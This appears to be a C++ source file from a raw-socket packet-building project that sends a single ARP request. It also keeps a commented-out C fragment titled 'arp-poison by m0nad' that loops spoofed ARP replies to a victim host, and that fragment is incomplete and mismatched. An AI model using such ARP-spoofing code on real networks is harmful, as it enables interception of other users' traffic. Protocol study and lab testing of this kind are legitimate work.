// //arp-poison by m0nad
// //tested in Linux 3.5.0
// #include <stdio.h>
// #include <stdlib.h>
// #include <string.h>
// #include <unistd.h>
// #include <arpa/inet.h>
// #include <net/if.h>
// #include <sys/socket.h>
// #include <netpacket/packet.h>
// #include <net/ethernet.h>
// #include <netinet/if_ether.h>
// #include <signal.h>

// #define IP4LEN 4
// #define PKTLEN sizeof(struct ether_header) + sizeof(struct ether_arp)

// int sock;

// typedef struct	s_ethernet_packet
// {
//   uint8_t	destination_mac_address[HARDWARE_LENGTH];
//   uint8_t	source_mac_address[HARDWARE_LENGTH];
//   uint16_t	ether_type;
// }		t_ethernet_packet;

// typedef struct	s_arp_packet
// {
//   uint16_t	hardware_type;
//   uint16_t	protocol_type;
//   uint8_t	hardware_len;
//   uint8_t	protocol_len;
//   uint16_t	opcode;
//   uint8_t	sender_mac[HARDWARE_LENGTH];
//   uint8_t	sender_ip[IP_LENGTH];
//   uint8_t	target_mac[HARDWARE_LENGTH];
//   uint8_t	target_ip[IP_LENGTH];
// }		t_arp_packet;


// t_arp_packet	*create_arp_packet(const uint16_t opcode,
// 				   const uint8_t *my_mac_address, const char *spoofed_ip_source,
// 				   const uint8_t *destination_mac_address, const char *destination_ip)
// {
//   t_arp_packet	*arp_packet;

//   if (!(arp_packet = malloc(sizeof(t_arp_packet))))
//     return (NULL);
//   arp_packet->hardware_type = htons(1);
//   arp_packet->protocol_type = htons(ETH_P_IP);
//   arp_packet->hardware_len = HARDWARE_LENGTH;
//   arp_packet->protocol_len = IP_LENGTH;
//   arp_packet->opcode = htons(opcode);
//   memcpy(&arp_packet->sender_mac, my_mac_address, sizeof(uint8_t) * HARDWARE_LENGTH);
//   memcpy(&arp_packet->target_mac, destination_mac_address, sizeof(uint8_t) * HARDWARE_LENGTH);
//   if (inet_pton(AF_INET, spoofed_ip_source, arp_packet->sender_ip) != 1
//       || inet_pton(AF_INET, destination_ip, arp_packet->target_ip) != 1)
//     return (NULL);
//   return (arp_packet);
// }

// t_ethernet_packet	*create_ethernet_packet(const uint8_t *src_mac,
// 						const uint8_t *dest_mac,
// 						const t_arp_packet *arp_packet)
// {
//   t_ethernet_packet	*ethernet_packet;

//   if (!(ethernet_packet = malloc(sizeof(uint8_t) * IP_MAXPACKET)))
//     return (NULL);
//   memcpy(&ethernet_packet->destination_mac_address, dest_mac, sizeof(uint8_t) * HARDWARE_LENGTH);
//   memcpy(&ethernet_packet->source_mac_address, src_mac, sizeof(uint8_t) * HARDWARE_LENGTH);
//   memcpy(&ethernet_packet->ether_type, (uint8_t[2]){ETH_P_ARP / 256, ETH_P_ARP % 256}, sizeof(uint8_t) * 2);
//   memcpy((uint8_t *)ethernet_packet + ETH_HEADER_LENGTH, arp_packet, sizeof(uint8_t) * ARP_HEADER_LENGTH);
//   return (ethernet_packet);
// }

// char			send_payload_to_victim(const int sd,
// 					       struct sockaddr_ll *device,
// 					       const uint8_t *my_mac_address,
// 					       const char *spoofed_ip_source,
// 					       const uint8_t *victim_mac_address,
// 					       const char *victim_ip)
// {
//   t_ethernet_packet	*ethernet_packet;
//   t_arp_packet		*arp_packet;

//   if (!(arp_packet = create_arp_packet(ARPOP_REPLY, my_mac_address,
// 				       spoofed_ip_source, victim_mac_address, victim_ip)))
//     return (fprintf(stderr, ERROR_PACKET_CREATION_ARP), FALSE);
//   if (!(ethernet_packet = create_ethernet_packet(my_mac_address, victim_mac_address, arp_packet)))
//     return (fprintf(stderr, ERROR_PACKET_CREATION_ETHER), FALSE);

//   while (TRUE)
//     {
//       if ((sendto(sd, ethernet_packet, ARP_HEADER_LENGTH + ETH_HEADER_LENGTH, 0,
// 		  (const struct sockaddr *)device, sizeof(*device))) <= 0)
// 	return (fprintf(stderr, ERROR_COULD_NOT_SEND), FALSE);
//       fprintf(stdout, "[+] SPOOFED Packet sent to '%s'\n", victim_ip);
//       sleep(SPOOFED_PACKET_SEND_DELAY);
//     }
//   return (TRUE);
// }


// // struct	ether_arp {
// // 	struct	arphdr ea_hdr;		/* fixed-size header */
// // 	uint8_t arp_sha[ETH_ALEN];	/* sender/my mac address */
// // 	uint8_t arp_spa[4];		/* sender/my ip address */
// // 	uint8_t arp_tha[ETH_ALEN];	/* target/searched mac address */
// // 	uint8_t arp_tpa[4];		/* target/searched ip address */
// // };

// int
// main(int argc, char ** argv)
// {
//   char packet[PKTLEN];
//   struct ether_header * eth = (struct ether_header *) packet;
//   struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
//   struct sockaddr_ll device;
 
//   if (argc < 4) {
//     usage();
//   }

//   sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
//   if (sock < 0)
//     perror("socket"), exit(1);

//   signal(SIGINT, cleanup);

//     // Mac address(sender) | fill arp sender hardware/mac address
//   sscanf(argv[3], "%x:%x:%x:%x:%x:%x",  (unsigned int *) &arp->arp_sha[0],
// 					(unsigned int *) &arp->arp_sha[1],
// 					(unsigned int *) &arp->arp_sha[2],
// 					(unsigned int *) &arp->arp_sha[3],
// 					(unsigned int *) &arp->arp_sha[4],
// 					(unsigned int *) &arp->arp_sha[5]);


//     // Ip address(sender) | fill arp sender protocol/ip address
//   sscanf(argv[2], "%d.%d.%d.%d", (int *) &arp->arp_spa[0],
//                                  (int *) &arp->arp_spa[1],
//                                  (int *) &arp->arp_spa[2],
//                                  (int *) &arp->arp_spa[3]);

//     // fill ethernet dst hardware/mac address (broadcast address)
//   memset(eth->ether_dhost, 0xff, ETH_ALEN);
//     // fill ethernet src hardware/mac address (broadcast address)
//   memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN);
//   eth->ether_type = htons(ETH_P_ARP);

//   arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
//   arp->ea_hdr.ar_pro = htons(ETH_P_IP);
//   arp->ea_hdr.ar_hln = ETH_ALEN;
//   arp->ea_hdr.ar_pln = IP4LEN;
//   arp->ea_hdr.ar_op = htons(ARPOP_REQUEST);
//   memset(arp->arp_tha, 0xff, ETH_ALEN);
//   memset(arp->arp_tpa, 0x00, IP4LEN);

//   memset(&device, 0, sizeof(device));
//   device.sll_ifindex = if_nametoindex(argv[1]);
//   device.sll_family = AF_PACKET;
//   memcpy(device.sll_addr, arp->arp_sha, ETH_ALEN);
//   device.sll_halen = htons(ETH_ALEN);

//   if (sendto(sock, packet, PKTLEN, 0, (struct sockaddr *) &device, sizeof(device)) < 0) {
//     perror("sendto error: ");
//   } else {
//     printf("sent the arp request successful!\n");
//   }
//   return 0;
// }





#include <iostream>
#include <array>
#include <algorithm>
#include <exception>
#include <cassert>
#include <cstring>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/time.h>

#include <asm/types.h>

#include <math.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

#include <linux/if_packet.h>
#include <linux/if_ether.h>
// #include <linux/if_arp.h>
#include <netinet/in.h>

#include "include/net-iface/iface_manager.h"

#include "include/frame-builder/ethernet_builder.h"
#include "include/frame-builder/arp_builder.h"

#include "include/utils/sock_addr_convertor.h"

#define DEBUG

posnet::IFaceConfiguration::IndexType GetIFaceIndex()
{
    posnet::IFaceManager ifaceManager;
    const auto configs = ifaceManager.getConfigs();
    auto it = std::find_if(configs.cbegin(), configs.cend(), [](const posnet::IFaceConfiguration config) {
        return config.getName() && (*config.getName() != posnet::IFaceConfiguration::LOOP_BACK_INTERFACE_NAME);
    });

    if (it != configs.cend()) {
        return *(it->getIndex());
    }

    throw std::runtime_error("Could not find iface index");
}

posnet::IFaceConfiguration::AddressType GetIFaceMacAddress()
{
    posnet::IFaceManager ifaceManager;
    const auto configs = ifaceManager.getConfigs();
    auto it = std::find_if(configs.cbegin(), configs.cend(), [](const posnet::IFaceConfiguration config) {
        return config.getName() && (*config.getName() != posnet::IFaceConfiguration::LOOP_BACK_INTERFACE_NAME);
    });

    if (it != configs.cend()) {
        return *(it->getMacAddress());
    }

    throw std::runtime_error("Could not find iface mac address");
}

posnet::IFaceConfiguration::AddressType GetIFaceIpAddress()
{
    posnet::IFaceManager ifaceManager;
    const auto configs = ifaceManager.getConfigs();
    auto it = std::find_if(configs.cbegin(), configs.cend(), [](const posnet::IFaceConfiguration config) {
        return config.getName() && (*config.getName() != posnet::IFaceConfiguration::LOOP_BACK_INTERFACE_NAME);
    });

    if (it != configs.cend()) {
        return *(it->getIpAddress());
    }

    throw std::runtime_error("Could not find iface ip address");
}

int main(void) {
    std::array<posnet::def::ByteType, 1024> buffer = {0};
    std::size_t bufferSize = 0;

    const auto ifaceIndex = GetIFaceIndex();
    
    const auto ifaceMacAddr = GetIFaceMacAddress();

    const auto ifaceIpAddr = GetIFaceIpAddress();

    const auto dstMacAddr = "";
    const auto dstIpAddr = "";
 

    // /*prepare sockaddr_ll*/
    struct sockaddr_ll socket_address;
    socket_address.sll_family = PF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = ifaceIndex;
    socket_address.sll_hatype = ARPHRD_ETHER;
    socket_address.sll_pkttype = 0;//PACKET_OTHERHOST;
    socket_address.sll_halen = 0;
    socket_address.sll_addr[6] = 0x00;
    socket_address.sll_addr[7] = 0x00;

    // Building frame
    {
        posnet::EthernetBuilder ethernetBuilder;
        ethernetBuilder.setProtocol(posnet::EthernetBuilder::ProtocolType::IP)
                .setDestMacAddress("")                                // -
                .setSourceMacAddress(ifaceMacAddr);                                       // +

        posnet::ArpBuilder arpBuilder;
        arpBuilder.setHardwareType(posnet::ArpBuilder::HardwareType::ARP) 
                .setProtocolType(posnet::ArpBuilder::ProtocolType::V4)    
                .setHardwareLength(posnet::ArpBuilder::HARDWARE_LENGTH)   
                .setProtocolLength(posnet::ArpBuilder::PROTOCOL_LENGTH)     
                .setOpcode(posnet::ArpBuilder::OpcodeType::ArpRequest)    
                .setSenderIpAddressAsStr(ifaceIpAddr)                     
                .setSenderMacAddressAsStr(ifaceMacAddr)                   
                .setTargetIpAddressAsStr(dstIpAddr)                       
                .setTargetMacAddressAsStr(dstMacAddr);                     

        // filling the buffer
        std::memcpy(buffer.data() + bufferSize, ethernetBuilder.getStart(), ethernetBuilder.getSize());
        bufferSize += ethernetBuilder.getSize();

        std::memcpy(buffer.data() + bufferSize, arpBuilder.getStart(), arpBuilder.getSize());
        bufferSize += arpBuilder.getSize();

#ifdef DEBUG
        std::cout << ethernetBuilder << std::endl;
        std::cout << arpBuilder << std::endl;
#endif //! DEBUG
    }

//     /*open socket*/
    auto sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket():");
        exit(1);
    }


    if (sendto(sock, buffer.data(), bufferSize, 0, (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
        perror("sendto: ");
    } else {
        std::cout << "Sent the the arp packet successful!" << std::endl;
    }

    return 0;
}